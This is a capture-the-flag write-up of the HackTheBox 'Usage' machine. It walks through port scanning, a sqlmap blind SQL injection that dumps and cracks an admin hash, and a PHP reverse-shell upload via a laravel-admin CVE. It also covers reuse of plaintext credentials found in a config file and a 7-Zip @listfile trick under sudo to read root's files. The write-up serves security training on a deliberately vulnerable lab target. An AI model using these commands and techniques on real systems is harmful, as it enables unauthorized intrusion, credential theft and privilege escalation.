---
layout: post
title: Usage HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox easy,linux]
permalink: /posts/usage-htb
image:
  path: /images/htb/easy/usage/icon.png
---

This one was pretty nice, the privesc was cool!

**Machine created by:** [rajHere](https://app.hackthebox.com/users/396413)

## Recon
I start off my recon by doing a portscan of the IP.

```
$ sudo nmap 10.10.11.18 -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-23 19:37 AEST
Nmap scan report for 10.10.11.18
Host is up (0.026s latency).
Not shown: 2498 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds
```

We can see 2 open ports, mainly of interest is HTTP.

I edit my `/etc/hosts` to make a new entry:

```
10.10.11.18 usage.htb
```

After that I visit [usage.htb](https://usage.htb) and see this:

![Front Page](/images/htb/easy/usage/frontpage.png)

I try clicking 'Admin' and get a 404 on `admin.usage.htb` so I add it to the `/etc/hosts`

```
10.10.11.18 usage.htb,admin.usage.htb
```

I see a admin login page, which is something to keep in mind.

![Admin Login](/images/htb/easy/usage/adminlogin.png)

I go back to `usage.htb` and register an account.

After logging in are some blogs which are not interacive:

![Blogs](/images/htb/easy/usage/blogs.png)

The blogs indicate Laravel PHP, but how do we gain access?

After **alot** of loking around, I find that there is Blind SQLi on the 'Reset Password' endpoint.

I use `sqlmap` to scan the endpoint as follows (I found the `usage_blog` database and `admin_users` table after doing some earlier `sqlmap` scans):
```
$ sqlmap --level 4 --risk 3 -u "http://usage.htb/forget-password" --data="_token=Dvccq5ZlKe099WfZqzMWqJn3RmpRWwudXqc17eFT&email=seal%40seall.dev" -p email --dbms=MySQL --dump -D usage_blog -T admin_users
...
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | users  | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2024-04-19 07:36:51 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
...
```

Now we have a password hash, specifically a `bcrypt2` hash, let's crack that baby with `hashcat`:
```
$ hashcat -m 3200 -a 0 hash rockyou.txt
...
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
...
```
Now that we have the password for the admin users, let's use it on that admin login (`admin:whatever1`)!

![Admin Panel](/images/htb/easy/usage/admin.png)

## Initial Access & User Flag

I got stuck here for a while aswell but after some more recon I found a CVE for one of the plugins, which links into the hint from the blogs for Laravel references and Server-Side language execution.

We can use a CVE in encore/laravel-admin, specifically [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/) to cause a PHP file to execute a reverse shell.

I open Burp Suite to intercept the image upload request and put in a reverse shell.

I setup my listener using `pwncat-cs`:
```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen 4444 -m linux
[16:41:53] new listener created for 0.0.0.0:4444
(local) pwncat$
```

I generate a PHP PentesterMonkey reverse shell with [RevShells.com](https://www.revshells.com/).

I then intercept the upload with Burp Suite:

![og](/images/htb/easy/usage/og.png)

I edit it to include a PHP reverse shell and change the extension accordingly.

![modified](/images/htb/easy/usage/mod.png)

And visit the upload URL: `http://admin.usage.htb/uploads/images/file.png.php`

And get a connection on my listener!
```
[20:10:14] 10.10.11.18:33370: registered new host w/db
           listener: 0.0.0.0:4444: linux session from 10.10.11.18:33370 established
(local) pwncat$
(remote) dash@usage:/$ cd ~
(remote) dash@usage:/home/dash$ ls
user.txt
(remote) dash@usage:/home/dash$ cat user.txt
b8fe7bbe0f00ebe75626d504bc914e04
```

User Flag: <mark>b8fe7bbe0f00ebe75626d504bc914e04</mark>

## Root Flag

I check the files inside my home directory and read `.monitrc` and see some credentials:
```
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
```

Going back to the home folder (`/home`) there is another user: `xander`.

Can we use this password to become `xander`?

```
(remote) dash@usage:/home$ su xander
Password:
xander@usage:/home$
```

Yes we can!

I instinctively run `sudo -l` and we have control over a binary.

```
$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

I run the binary to see what it does.
```
$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):
```

I try out all the options:
1. Backs up the files in `/var/www/html` with 7-Zip to a zip in `/var/backups/project.zip`
2. Has no output
3. Resets the admin password (shocker)

So I guess we start with 1, what capabilities does `7-Zip` have?
```
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Usage: 7z <command> [<switches>...] <archive_name> [<file_names>...]
       [<@listfiles...>]

<Commands>
  a : Add files to archive
  b : Benchmark
  d : Delete files from archive
  e : Extract files from archive (without using directory names)
  h : Calculate hash values for files
  i : Show information about supported formats
  l : List contents of archive
  rn : Rename files in archive
  t : Test integrity of archive
  u : Update files to archive
  x : eXtract files with full paths

<Switches>
  -- : Stop switches parsing
  -ai[r[-|0]]{@listfile|!wildcard} : Include archives
  -ax[r[-|0]]{@listfile|!wildcard} : eXclude archives
  -ao{a|s|t|u} : set Overwrite mode
  -an : disable archive_name field
  -bb[0-3] : set output log level
  -bd : disable progress indicator
  -bs{o|e|p}{0|1|2} : set output stream for output/error/progress line
  -bt : show execution time statistics
  -i[r[-|0]]{@listfile|!wildcard} : Include filenames
  -m{Parameters} : set compression Method
    -mmt[N] : set number of CPU threads
  -o{Directory} : set Output directory
  -p{Password} : set Password
  -r[-|0] : Recurse subdirectories
  -sa{a|e|s} : set Archive name mode
  -scc{UTF-8|WIN|DOS} : set charset for for console input/output
  -scs{UTF-8|UTF-16LE|UTF-16BE|WIN|DOS|{id}} : set charset for list files
  -scrc[CRC32|CRC64|SHA1|SHA256|*] : set hash function for x, e, h commands
  -sdel : delete files after compression
  -seml[.] : send archive by email
  -sfx[{name}] : Create SFX archive
  -si[{name}] : read data from stdin
  -slp : set Large Pages mode
  -slt : show technical information for l (List) command
  -snh : store hard links as links
  -snl : store symbolic links as links
  -sni : store NT security information
  -sns[-] : store NTFS alternate streams
  -so : write data to stdout
  -spd : disable wildcard matching for file names
  -spe : eliminate duplication of root folder for extract command
  -spf : use fully qualified file paths
  -ssc[-] : set sensitive case mode
  -ssw : compress shared files
  -stl : set archive timestamp from the most recently modified file
  -stm{HexMask} : set CPU thread affinity mask (hexadecimal number)
  -stx{Type} : exclude archive type
  -t{Type} : Set type of archive
  -u[-][p#][q#][r#][x#][y#][z#][!newArchiveName] : Update options
  -v{Size}[b|k|m|g] : Create volumes
  -w[{path}] : assign Work directory. Empty path means a temporary directory
  -x[r[-|0]]{@listfile|!wildcard} : eXclude filenames
  -y : assume Yes on all queries
```

Considering we can make files in the directory, would a symlink to the `root.txt` work? Not by itself.

I see something of interest mentioned in the help, `@listfile`. Could we use this to read a file? I do some experimenting on my local machine.

```
$ mkdir test
$ echo 'SECRET!!!!!! DONT READ MEEEE' > test/secret.txt
$ ln -s test/secret.txt secret-symlink.txt
$ echo '' > @secret-symlink.txt
$ 7z a out.7z *
...
WARNING: No such file or directory
SECRET!!!!!! DONT READ MEEEE

1 folder, 2 files, 58 bytes (1 KiB)

Creating archive: out.7z

Items to compress: 3


Files read from disk: 2
Archive size: 237 bytes (1 KiB)

Scan WARNINGS for files and folders:

SECRET!!!!!! DONT READ MEEEE : No such file or directory
...
```

It reads the file! Let's do it for `/root/root.txt` on the server.
```
$ echo '' > @root.txt
$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54875750

Scanning the drive:

WARNING: No more files
e132706f568fa3333fd0a68970ac6af9
...
```

Woohoo!

Root Flag: <mark>e132706f568fa3333fd0a68970ac6af9</mark>

![Success](/images/htb/easy/usage/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.